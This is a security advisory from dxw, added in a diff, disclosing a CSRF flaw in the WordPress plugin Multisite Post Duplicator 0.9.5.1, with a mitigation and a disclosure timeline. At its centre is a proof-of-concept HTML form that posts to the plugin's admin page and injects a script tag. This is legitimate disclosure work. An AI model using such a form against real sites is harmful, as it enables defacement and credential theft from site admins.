@@ -1,0 +1,64 @@
+<!--
+Details
+================
+Software: Multisite Post Duplicator
+Version: 0.9.5.1
+Homepage: http://wordpress.org/plugins/multisite-post-duplicator/
+Advisory report: https://security.dxw.com/advisories/csrf-vulnerability-in-multisite-post-duplicator-could-allow-an-attacker-to-do-almost-anything-an-admin-user-can-do/
+CVE: Awaiting assignment
+CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)
+
+Description
+================
+CSRF vulnerability in Multisite Post Duplicator could allow an attacker to do almost anything an admin user can do
+
+Vulnerability
+================
+Contains a CSRF vulnerability which can copy content from one site of a multisite installation to another.
+This could be used to add arbitrary HTML to the front-end of the site (which could be used for defacement, harvesting login credentials from authenticated users, or could be used to do virtually anything a logged-in admin user can do).
+This could also be used to view content not meant to be published.
+
+Proof of concept
+================
+Some of these values may need adjusting depending on the post IDs, blog IDs, etc.
+-->
+
+<form method=\"POST\" action=\"http://localhost/wp-admin/tools.php?page=mpd\">
+  <input type=\"text\" name=\"mpd-post-status\" value=\"draft\">
+  <input type=\"text\" name=\"mdp-prefix\" value=\"<script>alert(1)</script>\">
+  <input type=\"text\" name=\"action\" value=\"add_foobar\">
+  <input type=\"text\" name=\"el0\" value=\"post\">
+  <input type=\"text\" name=\"el1\" value=\"1\">
+  <input type=\"text\" name=\"el2\" value=\"1\">
+  <input type=\"text\" name=\"el3\" value=\"1\">
+  <input type=\"text\" name=\"duplicate-submit\" value=\"Duplicate\">
+  <input type=\"submit\">
+</form>
+
+<!--
+Mitigations
+================
+Update to version 1.1.3 or later.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2016-11-01: Discovered
+2016-12-07: Tested version 1.1.3 and found the plugin no longer vulnerable to the attack as described
+2016-12-09: Advisory published
+
+
+
+Discovered by dxw:
+================
+Tom Adams
+Please visit security.dxw.com for more information.
+-->
